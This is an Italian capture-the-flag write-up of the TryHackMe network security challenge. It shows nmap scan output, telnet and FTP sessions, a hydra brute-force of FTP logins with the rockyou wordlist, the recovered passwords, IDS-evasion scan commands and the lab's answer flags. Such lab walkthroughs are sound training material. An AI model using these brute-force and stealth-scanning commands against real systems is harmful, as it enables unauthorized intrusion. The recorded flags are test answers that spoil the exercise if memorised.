
#tryhackmelabs #laboratorio 

https://tryhackme.com/room/netsecchallenge

Usa questa sfida per testare la tua padronanza delle competenze acquisite nel modulo Network Security. Tutte le domande di questa sfida possono essere risolte usando solo `nmap`, `telnet`, e `hydra`.

```
map -sV -O -Pn -sS -v -p- 10.10.187.176
```

```
root@ip-10-10-115-42:~# nmap -sV -O -Pn -sS -v -p- 10.10.187.176
Starting Nmap 7.80 ( https://nmap.org ) at 2024-12-28 06:21 GMT
NSE: Loaded 45 scripts for scanning.
Initiating ARP Ping Scan at 06:21
Scanning 10.10.187.176 [1 port]
Completed ARP Ping Scan at 06:21, 0.04s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 06:21
Completed Parallel DNS resolution of 1 host. at 06:21, 0.00s elapsed
Initiating SYN Stealth Scan at 06:21
Scanning 10.10.187.176 [65535 ports]
Discovered open port 80/tcp on 10.10.187.176
Discovered open port 139/tcp on 10.10.187.176
Discovered open port 22/tcp on 10.10.187.176
Discovered open port 445/tcp on 10.10.187.176
Discovered open port 8080/tcp on 10.10.187.176
Discovered open port 10021/tcp on 10.10.187.176
Completed SYN Stealth Scan at 06:21, 4.86s elapsed (65535 total ports)
Initiating Service scan at 06:21
Scanning 6 services on 10.10.187.176
Completed Service scan at 06:21, 11.02s elapsed (6 services on 1 host)
Initiating OS detection (try #1) against 10.10.187.176
Retrying OS detection (try #2) against 10.10.187.176
Retrying OS detection (try #3) against 10.10.187.176
Retrying OS detection (try #4) against 10.10.187.176
Retrying OS detection (try #5) against 10.10.187.176
NSE: Script scanning 10.10.187.176.
Initiating NSE at 06:21
Completed NSE at 06:21, 0.07s elapsed
Initiating NSE at 06:21
Completed NSE at 06:21, 0.02s elapsed
Nmap scan report for 10.10.187.176
Host is up (0.00039s latency).
Not shown: 65529 closed ports
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         (protocol 2.0)
80/tcp    open  http        lighttpd
139/tcp   open  netbios-ssn Samba smbd 4.6.2
445/tcp   open  netbios-ssn Samba smbd 4.6.2
8080/tcp  open  http        Node.js (Express middleware)
10021/tcp open  ftp         vsftpd 3.0.5
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port22-TCP:V=7.80%I=7%D=12/28%Time=676F98E2%P=x86_64-pc-linux-gnu%r(NUL
SF:L,2A,"SSH-2\.0-OpenSSH_8\.2p1\x20THM{946219583339}\x20\r\n");
MAC Address: 02:C2:18:9F:F8:29 (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=12/28%OT=22%CT=1%CU=37547%PV=Y%DS=1%DC=D%G=Y%M=02C218%
OS:TM=676F98F2%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10A%TI=Z%CI=Z%II=
OS:I%TS=A)OPS(O1=M2301ST11NW7%O2=M2301ST11NW7%O3=M2301NNT11NW7%O4=M2301ST11
OS:NW7%O5=M2301ST11NW7%O6=M2301ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=
OS:F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M2301NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%
OS:T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T
OS:=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=
OS:0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(
OS:R=Y%DFI=N%T=40%CD=S)

Uptime guess: 8.210 days (since Fri Dec 20 01:19:40 2024)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Unix

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.84 seconds
           Raw packets sent: 65646 (2.892MB) | Rcvd: 65606 (2.628MB)

```
Qual è il numero di porte aperte più alto, inferiore a 10.000?


```
8080
```

C'è una porta aperta al di fuori delle 1000 porte comuni; è sopra le 10.000. Di cosa si tratta?  

```
10021
```

Quante porte TCP sono aperte?  

```
6
```

Cos'è il flag nascosto nell'intestazione del server HTTP?  

```
root@ip-10-10-115-42:~# telnet 10.10.187.176 80
Trying 10.10.187.176...
Connected to 10.10.187.176.
Escape character is '^]'.
GET /index.html HTTP/1.1
host: telnet

HTTP/1.1 200 OK
Vary: Accept-Encoding
Content-Type: text/html
Accept-Ranges: bytes
ETag: "229449419"
Last-Modified: Tue, 14 Sep 2021 07:33:09 GMT
Content-Length: 226
Date: Sat, 28 Dec 2024 06:24:47 GMT
Server: lighttpd THM{web_server_25352}

<!DOCTYPE html>
<html lang="en">
<head>
  <title>Hello, world!</title>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
</head>
<body>
  <h1>Hello, world!</h1>
</body>
</html>
Connection closed by foreign host.
root@ip-10-10-115-42:~# 


```
Qual è il flag nascosto nell'intestazione del server SSH?  

```
THM{946219583339}
```

Abbiamo un server FTP in ascolto su una porta non standard. Qual è la versione del server FTP?  

```
vsftpd 3.0.5
```

Abbiamo scoperto due nomi utente tramite social engineering:  `eddie` e  `quinn`. Qual è il flag nascosto in uno di questi due file di account e accessibile tramite FTP?  

```
hydra -l eddie -P /usr/share/wordlists/rockyou.txt ftp://10.10.187.176:10021 -t 4
```
login: eddie   password: jordan

```
root@ip-10-10-115-42:~# ftp 10.10.187.176 10021
Connected to 10.10.187.176.
220 (vsFTPd 3.0.5)
Name (10.10.187.176:root): eddie
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
226 Directory send OK.
ftp> 

```
login: quinn   password: andrea
```
root@ip-10-10-115-42:~#  ftp 10.10.187.176 10021
Connected to 10.10.187.176.
220 (vsFTPd 3.0.5)
Name (10.10.187.176:root): quinn
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-rw-r--    1 1002     1002           18 Sep 20  2021 ftp_flag.txt
226 Directory send OK.
ftp> cat ftp_flag.txt
?Invalid command
ftp> less ftp_flag.txt
?Invalid command
ftp> get ftp_flag.txt
local: ftp_flag.txt remote: ftp_flag.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for ftp_flag.txt (18 bytes).
226 Transfer complete.
18 bytes received in 0.00 secs (30.4120 kB/s)
exit
```
```
root@ip-10-10-115-42:~# cat ftp_flag.txt
THM{321452667098}
```
Navigando su  `http://MACHINE_IP:8080` viene visualizzata una piccola sfida che ti darà una bandiera una volta risolta. Cos'è la bandiera?

Your mission is to use Nmap to scan 10.10.187.176 (this machine)
as covertly as possible and avoid being detected by the IDS.
```
nmap -sF -T2 -f -D RND:10 -p8080 -n 10.10.187.176
```
	funziona ma non per la sfida
proviamo
```
nmap -sN 10.10.187.176
```
```
 Exercise Complete! Task answer: THM{f7443f99} 
```







